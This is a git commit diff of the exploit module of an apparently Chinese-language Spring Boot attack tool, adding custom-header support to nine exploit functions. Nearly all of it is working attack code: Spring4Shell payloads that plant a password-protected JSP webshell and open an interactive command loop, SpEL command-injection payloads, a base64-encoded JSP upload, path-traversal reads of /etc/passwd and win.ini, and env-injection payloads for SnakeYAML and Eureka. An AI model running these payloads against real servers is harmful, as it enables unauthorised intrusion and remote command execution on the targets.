abd92c9746cb254adcb5528182f71b5dd79ac492
曾哥 <54609266+AabyssZG@users.noreply.github.com>
2023-12-31 12:52:15 +0800

    Update vul.py

--- inc/vul.py
+++ inc/vul.py
@@ -18,9 +18,18 @@ ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like
       "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20130406 Firefox/23.0",
       "Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00"]
 
-def CVE_2022_22965(url, proxies):
+def JSON_handle(header1, header2):
+    dict1 = json.loads(str(header1).replace("'", "\""))
+    dict2 = json.loads(str(header2).replace("'", "\""))
+    # 合并两个字典
+    merged_dict = {**dict1, **dict2}
+    # 将合并后的字典转换为 JSON 字符串
+    result_json = json.dumps(merged_dict, indent=2)
+    return result_json
+
+def CVE_2022_22965(url, proxies, header_new):
     cprint("======开始对目标URL进行CVE-2022-22965漏洞利用======", "green")
-    Headers_1 = {
+    oldHeaders_1 = {
         "User-Agent": random.choice(ua),
         "prefix": "<%",
         "suffix": "%>//",
@@ -29,10 +38,12 @@ def CVE_2022_22965(url, proxies):
         "c2": "<%",
         "DNT": "1",
     }
-    Headers_2 = {
+    oldHeaders_2 = {
         "User-Agent": random.choice(ua),
         "Content-Type": "application/x-www-form-urlencoded"
     }
+    Headers_1 = json.loads(str(JSON_handle(oldHeaders_1, header_new)).replace("'", "\""))
+    Headers_2 = json.loads(str(JSON_handle(oldHeaders_2, header_new)).replace("'", "\""))
     payload_linux = """class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22aabysszg%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(new String[]{%22bash%22,%22-c%22,request.getParameter(%22cmd%22)}).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="""
     payload_win = """class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22aabysszg%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(new String[]{%22cmd%22,%22/c%22,request.getParameter(%22cmd%22)}).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="""
     payload_http = """?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="""
@@ -51,7 +62,7 @@ def CVE_2022_22965(url, proxies):
         sleep(0.5)
         test = requests.get(url + "shell.jsp", verify=False, proxies=proxies)
         test_again = requests.get(url + "shell.jsp", verify=False, proxies=proxies)
-        if (test.status_code == 500) or (test_again.status_code == 200):
+        if (test_again.status_code == 200):
             cprint("[+] 存在编号为CVE-2022-22965的RCE漏洞，上传Webshell为：" + url + "shell.jsp?pwd=aabysszg&cmd=whoami" ,"red")
             while 1:
                 Cmd = input("[+] 请输入要执行的命令>>> ")
@@ -78,13 +89,11 @@ def CVE_2022_22965(url, proxies):
         f2.write(str(e) + '\n')
         f2.close()
 
-def CVE_2022_22963(url, proxies):
+def CVE_2022_22963(url, proxies, header_new):
     cprint("======开始对目标URL进行CVE-2022-22963漏洞利用======", "green")
-    payload = f'T(java.lang.Runtime).getRuntime().exec("whoami")'
-
+    header = {'spring.cloud.function.routing-expression': 'T(java.lang.Runtime).getRuntime().exec("whoami")'}
     data = 'test'
-    header = {
-        'spring.cloud.function.routing-expression': payload,
+    oldHeader = {
         'Accept-Encoding': 'gzip, deflate',
         'Accept': '*/*',
         'Accept-Language': 'en',
@@ -92,7 +101,8 @@ def CVE_2022_22963(url, proxies):
         'Content-Type': 'application/x-www-form-urlencoded'
     }
     path = 'functionRouter'
-    
+    headernew = json.loads(str(JSON_handle(oldHeader, header_new)).replace("'", "\""))
+    header.update(headernew)
     try:
         url = url + path
         requests.packages.urllib3.disable_warnings()
@@ -100,9 +110,8 @@ def CVE_2022_22963(url, proxies):
         code = req.status_code
         text = req.text
         rsp = '"error":"Internal Server Error"'
-        if code == 500 and rsp in text:
-            cprint(f'[+] {url} 存在编号为CVE-2022-22963的RCE漏洞，请手动反弹Shell', "red")
-            print('\n')
+        if (code == 500) and (rsp in text):
+            cprint(f'[+] {url} 存在编号为CVE-2022-22963的RCE漏洞，请手动反弹Shell\n', "red")
         else:
             cprint("[-] CVE-2022-22963漏洞不存在\n", "yellow")
     except KeyboardInterrupt:
@@ -114,21 +123,21 @@ def CVE_2022_22963(url, proxies):
         f2.write(str(e) + '\n')
         f2.close()
 
-def CVE_2022_22947(url, proxies):
+def CVE_2022_22947(url, proxies, header_new):
     cprint("======开始对目标URL进行CVE-2022-22947漏洞利用======","green")
-    headers1 = {
+    oldHeader_1 = {
         'Accept-Encoding': 'gzip, deflate',
         'Accept': '*/*',
         'Accept-Language': 'en',
         'User-Agent': random.choice(ua),
         'Content-Type': 'application/json'
     }
-
-    headers2 = {
+    oldHeader_2 = {
         'User-Agent': random.choice(ua),
         'Content-Type': 'application/x-www-form-urlencoded'
     }
-
+    headers1 = json.loads(str(JSON_handle(oldHeader_1, header_new)).replace("'", "\""))
+    headers2 = json.loads(str(JSON_handle(oldHeader_2, header_new)).replace("'", "\""))
     payload = '''{\r
               "id": "hacktest",\r
               "filters": [{\r
@@ -185,9 +194,9 @@ def CVE_2022_22947(url, proxies):
         f2.write(str(e) + '\n')
         f2.close()
 
-def JeeSpring_2023(url,proxies):
+def JeeSpring_2023(url, proxies, header_new):
     cprint("======开始对目标URL进行2023JeeSpring任意文件上传漏洞利用======","green")
-    headers1 = {
+    oldHeader = {
         'User-Agent': random.choice(ua),
         'Content-Type': 'multipart/form-data;boundary=----WebKitFormBoundarycdUKYcs7WlAxx9UL',
         'Accept-Encoding': 'gzip, deflate',
@@ -195,7 +204,7 @@ def JeeSpring_2023(url,proxies):
         'Accept-Language': 'zh-CN,zh;q=0.9,ja;q=0.8',
         'Connection': 'close'
     }
-
+    headers1 = json.loads(str(JSON_handle(oldHeader, header_new)).replace("'", "\""))
     payload2 = b'LS0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5Y2RVS1ljczdXbEF4eDlVTA0KQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJmaWxlIjsgZmlsZW5hbWU9ImxvZy5qc3AiDQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbQ0KDQo8JSBvdXQucHJpbnRsbigiSGVsbG8gV29ybGQiKTsgJT4NCi0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeWNkVUtZY3M3V2xBeHg5VUwtLQo='
     payload = base64.b64decode(payload2)
     path = 'static/uploadify/uploadFile.jsp?uploadPath=/static/uploadify/'
@@ -226,17 +235,18 @@ def JeeSpring_2023(url,proxies):
         f2.write(str(e) + '\n')
         f2.close()
 
-def JolokiaRCE(url,proxies):
+def JolokiaRCE(url, proxies, header_new):
     cprint("======开始对目标URL进行Jolokia系列RCE漏洞测试======","green")
     path1 = 'jolokia'
     path2 = 'actuator/jolokia'
     path3 = 'jolokia/list'
-    
+    oldHeader = {"User-Agent": random.choice(ua)}
+    headers1 = json.loads(str(JSON_handle(oldHeader, header_new)).replace("'", "\""))
     try:
         requests.packages.urllib3.disable_warnings()
-        re1 = requests.post(url=url + path1, timeout=10, allow_redirects=False, verify=False, proxies=proxies)
+        re1 = requests.post(url=url + path1, headers=headers1, timeout=10, allow_redirects=False, verify=False, proxies=proxies)
         code1 = re1.status_code
-        re2 = requests.post(url=url + path2, timeout=10, allow_redirects=False, verify=False, proxies=proxies)
+        re2 = requests.post(url=url + path2, headers=headers1, timeout=10, allow_redirects=False, verify=False, proxies=proxies)
         code2 = re2.status_code
         if ((int(code1) == 200) or (int(code2) == 200)):
             cprint("[+] 发现jolokia相关路径状态码为200，进一步验证", "red")
@@ -262,19 +272,20 @@ def JolokiaRCE(url,proxies):
         f2.write(str(e) + '\n')
         f2.close()
 
-def CVE_2021_21234(url,proxies):
+def CVE_2021_21234(url,proxies, header_new):
     cprint("======开始对目标URL进行CVE-2021-21234漏洞测试======","green")
     payload1 = 'manage/log/view?filename=/windows/win.ini&base=../../../../../../../../../../'
     payload2 = 'log/view?filename=/windows/win.ini&base=../../../../../../../../../../'
     payload3 = 'manage/log/view?filename=/etc/passwd&base=../../../../../../../../../../'
     payload4 = 'log/view?filename=/etc/passwd&base=../../../../../../../../../../'
-
+    oldHeader = {"User-Agent": random.choice(ua)}
+    headers1 = json.loads(str(JSON_handle(oldHeader, header_new)).replace("'", "\""))
     try:
         requests.packages.urllib3.disable_warnings()
-        re1 = requests.post(url=url + payload1, verify=False, proxies=proxies)
-        re2 = requests.post(url=url + payload2, verify=False, proxies=proxies)
-        re3 = requests.post(url=url + payload3, verify=False, proxies=proxies)
-        re4 = requests.post(url=url + payload4, verify=False, proxies=proxies)
+        re1 = requests.post(url=url + payload1, headers=headers1, timeout=10, verify=False, proxies=proxies)
+        re2 = requests.post(url=url + payload2, headers=headers1, timeout=10, verify=False, proxies=proxies)
+        re3 = requests.post(url=url + payload3, headers=headers1, timeout=10, verify=False, proxies=proxies)
+        re4 = requests.post(url=url + payload4, headers=headers1, timeout=10, verify=False, proxies=proxies)
         if (('MAPI' in str(re1.text)) or ('MAPI' in str(re2.text))):
             cprint("[+] 发现Spring Boot目录遍历漏洞且系统为Win，Poc路径如下：", "red")
             cprint(url + payload1, "red")
@@ -294,20 +305,21 @@ def CVE_2021_21234(url,proxies):
         f2.write(str(e) + '\n')
         f2.close()
 
-def SnakeYAML_RCE(url,proxies):
+def SnakeYAML_RCE(url, proxies, header_new):
     cprint("======开始对目标URL进行SnakeYAML RCE漏洞测试======","green")
-    Headers_1 = {
+    oldHeaders_1 = {
         "User-Agent": random.choice(ua),
         "Content-Type": "application/x-www-form-urlencoded"
         }
-    Headers_2 = {
+    oldHeaders_2 = {
         "User-Agent": random.choice(ua),
         "Content-Type": "application/json"
         }
     payload_1 = "spring.cloud.bootstrap.location=http://127.0.0.1/example.yml"
     payload_2 = "{\"name\":\"spring.main.sources\",\"value\":\"http://127.0.0.1/example.yml\"}"
     path = 'env'
-    
+    Headers_1 = json.loads(str(JSON_handle(oldHeaders_1, header_new)).replace("'", "\""))
+    Headers_2 = json.loads(str(JSON_handle(oldHeaders_2, header_new)).replace("'", "\""))
     try:
         requests.packages.urllib3.disable_warnings()
         urltest = url + path
@@ -332,21 +344,22 @@ def SnakeYAML_RCE(url,proxies):
         f2.write(str(e) + '\n')
         f2.close()
 
-def Eureka_xstream_RCE(url,proxies):
+def Eureka_xstream_RCE(url, proxies, header_new):
     cprint("======开始对目标URL进行Eureka_Xstream反序列化漏洞测试======","green")
-    Headers_1 = {
+    oldHeaders_1 = {
         "User-Agent": random.choice(ua),
         "Content-Type": "application/x-www-form-urlencoded"
         }
-    Headers_2 = {
+    oldHeaders_2 = {
         "User-Agent": random.choice(ua),
         "Content-Type": "application/json"
         }
+    Headers_1 = json.loads(str(JSON_handle(oldHeaders_1, header_new)).replace("'", "\""))
+    Headers_2 = json.loads(str(JSON_handle(oldHeaders_2, header_new)).replace("'", "\""))
     payload_1 = "eureka.client.serviceUrl.defaultZone=http://127.0.0.2/example.yml"
     payload_2 = "{\"name\":\"eureka.client.serviceUrl.defaultZone\",\"value\":\"http://127.0.0.2/example.yml\"}"
     path1 = 'env'
     path2 = 'actuator/env'
-    
     try:
         requests.packages.urllib3.disable_warnings()
         urltest1 = url + path1
@@ -372,12 +385,13 @@ def Eureka_xstream_RCE(url,proxies):
         f2.write(str(e) + '\n')
         f2.close()
 
-def CVE_2018_1273(url,proxies):
+def CVE_2018_1273(url, proxies, header_new):
     cprint("======开始对目标URL进行Spring_Data_Commons远程命令执行漏洞测试======","green")
-    Headers = {
+    oldHeaders = {
         "User-Agent": random.choice(ua),
         "Content-Type": "application/x-www-form-urlencoded"
         }
+    Headers = json.loads(str(JSON_handle(oldHeaders, header_new)).replace("'", "\""))
     path1 = 'users'
     path2 = 'users?page=0&size=5'
     payload1 = "username[#this.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"whoami\")]=chybeta&password=chybeta&repeatedPassword=chybeta"
@@ -417,16 +431,16 @@ def CVE_2018_1273(url,proxies):
         f2.write(str(e) + '\n')
         f2.close()
 
-def vul(url,proxies):
+def vul(url, proxies, header_new):
     functions = {
-        1: CVE_2021_21234,
+        1: JeeSpring_2023,
         2: CVE_2022_22947,
         3: CVE_2022_22963,
         4: CVE_2022_22965,
-        5: SnakeYAML_RCE,
-        6: JolokiaRCE,
-        7: JeeSpring_2023,
-        8: Eureka_xstream_RCE,
+        5: CVE_2021_21234,
+        6: SnakeYAML_RCE,
+        7: Eureka_xstream_RCE,
+        8: JolokiaRCE,
         9: CVE_2018_1273,
     }
     cprint("[+] 目前漏洞库内容如下：","green")
@@ -443,7 +457,7 @@ def vul(url,proxies):
     for choice in choices:
         selected_func = functions.get(choice)
         if selected_func:
-            selected_func(url, proxies)
+            selected_func(url, proxies, header_new)
         else:
             print(f"{choice} 输入错误，请重新输入漏洞选择模块\n")
             break
